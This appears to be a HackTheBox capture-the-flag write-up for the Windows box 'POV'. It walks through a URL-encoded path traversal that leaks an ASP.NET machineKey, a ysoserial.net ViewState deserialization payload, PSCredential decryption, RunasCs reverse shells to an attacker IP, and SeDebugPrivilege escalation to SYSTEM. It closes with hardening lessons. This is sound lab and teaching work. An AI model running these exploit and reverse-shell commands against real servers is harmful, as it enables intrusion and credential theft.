---
title: "POV"
date: 2024-04-13
type: docs
tags:
  - htb
  - windows
  - medium
  - iis
  - aspnet
  - path-traversal
  - web-config
  - machinekey
  - viewstate
  - deserialization
  - ysoserial-net
  - import-clixml
  - pscredential
  - runascs
  - sedebugprivilege
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows Server 2019, **Difficulty:** Medium, **Released:** 2024-04-13, **IP:** `10.10.11.251` , `pov.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes cover recon, the path traversal, and the ViewState technique. The `alaading` pivot and SYSTEM step are reconstructed from published writeups (benheater, Siddhi) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. IIS site `pov.htb`. A vhost sweep finds `dev.pov.htb`, whose `download.aspx?file=` is **path traversal**. URL-encode the Windows drive prefix (`:\` , `%3a%5c`) and read `web.config`, which holds the ASP.NET `machineKey` (`validationKey` / `decryptionKey`).
2. With the machine key, forge a malicious **`__VIEWSTATE`** with `ysoserial.net`. IIS deserializes it. RCE as **`sfitz`**.
3. `sfitz`'s Documents has `connection.xml`, an exported **PSCredential**. `Import-CliXml` recovers `alaading : f8gQ8fynP44ek1m3`. `RunasCs.exe` (or `Invoke-Command`) gets an `alaading` shell.
4. `alaading` has **`SeDebugPrivilege`**. Use `PsGetSys.ps1` (or a meterpreter migrate) to open a SYSTEM process and run code in it. SYSTEM.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `connection.xml` (PSCredential) | `alaading : f8gQ8fynP44ek1m3` |
| `user.txt` | `C:\Users\alaading\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

POV is a clean ASP.NET box. The foothold is the classic **web.config to machineKey to ViewState** chain: a path traversal leaks the server's static `machineKey`, and once you have the `validationKey` and `decryptionKey` you can forge a `__VIEWSTATE` that the framework deserializes, which `ysoserial.net` turns into RCE. The pivot is **`Import-CliXml`** on an exported `PSCredential`, which is a Windows footgun: `Export-CliXml` on a credential produces a file that anyone can decrypt *if it was exported without DPAPI user scoping*, or that decrypts trivially for the same user. Root is **`SeDebugPrivilege`**, which lets you open a handle to any process, so you inject into or migrate into a SYSTEM process.

Related ViewState / .NET deserialization: [Anubis](/writeups/hackthebox/windows/insane/anubis/), [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related exported-credential file: [POV](/writeups/hackthebox/windows/medium/pov/) is the reference. Related token / privilege abuse to SYSTEM: [Hack Smarter Security](/writeups/tryhackme/windows/medium/hack-smarter-security/), [Anubis](/writeups/hackthebox/windows/insane/anubis/).

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
```

A vhost sweep (or the page source) reveals `dev.pov.htb`, a "portfolio" site with a `download.aspx?file=cv.pdf` link.

### Path traversal in download.aspx

<div class="callout callout-note">

**Encoding a Windows path**

`download.aspx` does `Response.WriteFile(Server.MapPath(Request["file"]))` style handling with a light filter. To smuggle an absolute path through it, URL-encode the drive prefix so the filter does not see `:` or `\`:
```
:\  ->  %3a%5c
\   ->  %5c
```
`file=..%5c..%5c..%5cinetpub%5cwwwroot%5cweb.config` (or the absolute `C%3a%5c...`) returns `web.config`.

</div>

```xml
<machineKey decryption="AES" validation="SHA1"
  decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94ADCB4B2F6B93D9B411E82"
  validationKey="5620D3D029F914F4CD1BD46F0F16E9E0B9B6693F9F439A97D9866514AC81DD493AC1F2C5CCD2CB49782B282ACA729B1CB48E46E33E2545430E1B92CE51B5AC3C" />
```

### Foothold, forge the ViewState

<div class="callout callout-note">

**Why a leaked machineKey is RCE**

ASP.NET protects `__VIEWSTATE` with an HMAC (`validationKey`) and, if `viewStateEncryptionMode` is on, AES (`decryptionKey`). Those keys are meant to be random per-app. When you have them, you can craft a `__VIEWSTATE` that passes validation and whose payload is a serialized .NET object. `ysoserial.net`'s `ViewState` plugin builds one with a `TypeConfuseDelegate` / `ActivitySurrogateSelector` gadget that runs a command on deserialization.

</div>

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator="<__VIEWSTATEGENERATOR value>" \
  --validationkey="5620D3D0..." --validationalg="SHA1" \
  --decryptionkey="74477CEB..." --decryptionalg="AES" \
  -c "powershell -e <b64 reverse shell>"
```

POST that as `__VIEWSTATE` to the `dev` page. Shell as **`sfitz`**.

### sfitz to alaading

```powershell
type C:\Users\sfitz\Documents\connection.xml
```

```xml
<Objs ...><Obj RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCredential</T></TN>
  <Props><S N="UserName">alaading</S>
  <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb...</SS></Props></Obj></Objs>
```

<div class="callout callout-note">

**`Import-CliXml` on an exported credential**

`Export-CliXml` on a `PSCredential` writes the password as a DPAPI blob scoped to the **user and machine** that exported it. Running as that same user (`sfitz`), `Import-CliXml` decrypts it back to plaintext:
```powershell
$c = Import-CliXml C:\Users\sfitz\Documents\connection.xml
$c.GetNetworkCredential().Password        # f8gQ8fynP44ek1m3
```

</div>

```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell -r 10.10.14.5:9002
```

`user.txt` is on `alaading`'s desktop.

### Privilege Escalation, SeDebugPrivilege

```powershell
whoami /priv
# SeDebugPrivilege   Enabled
```

<div class="callout callout-note">

**SeDebugPrivilege to SYSTEM**

`SeDebugPrivilege` lets a process `OpenProcess` any other process with full access, including SYSTEM processes. From there you can inject a thread, or duplicate the process token and `CreateProcessWithTokenW`. `PsGetSys.ps1` picks a SYSTEM pid (`winlogon`, `lsass`) and spawns a child in its context. Metasploit's `migrate` does the same via `SeDebugPrivilege`.
```powershell
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process winlogon).Id, "cmd.exe /c powershell -e <b64 rev shell>")
```

</div>

Catch a SYSTEM shell, read `root.txt`.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Users\alaading\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Rotate the ASP.NET `machineKey`** and never commit it. A leaked key is unauthenticated RCE via ViewState.
- **Canonicalise file paths** in download handlers. Reject anything that resolves outside the intended directory; URL-decoding tricks are endless.
- **Do not leave exported credentials on disk.** `connection.xml` from `Export-CliXml` is a password file. Use a vault or Group Managed Service Accounts.
- **`SeDebugPrivilege` is effectively admin.** Remove it from service and user accounts that do not need debugging rights.

---

## Related Writeups

- **ViewState / .NET deserialization:** [Anubis](/writeups/hackthebox/windows/insane/anubis/), [GameBuzz](/writeups/tryhackme/linux/hard/gamebuzz/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)
- **Credential file on disk:** [POV](/writeups/hackthebox/windows/medium/pov/) `connection.xml`, see also [Bolt](/writeups/hackthebox/linux/medium/bolt/) / [Environment](/writeups/hackthebox/linux/medium/environment/)
- **Windows privilege abuse to SYSTEM:** [Hack Smarter Security](/writeups/tryhackme/windows/medium/hack-smarter-security/), [Anubis](/writeups/hackthebox/windows/insane/anubis/)
- **Path traversal in a download endpoint:** [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Titanic](/writeups/hackthebox/linux/easy/titanic/)

## References

- HTB POV (benheater) <https://benheater.com/hackthebox-pov/>
- Exploiting ViewState (HackTricks) <https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter>
- ysoserial.net <https://github.com/pwntester/ysoserial.net>
- PsGetSys.ps1 <https://github.com/decoder-it/psgetsystem>
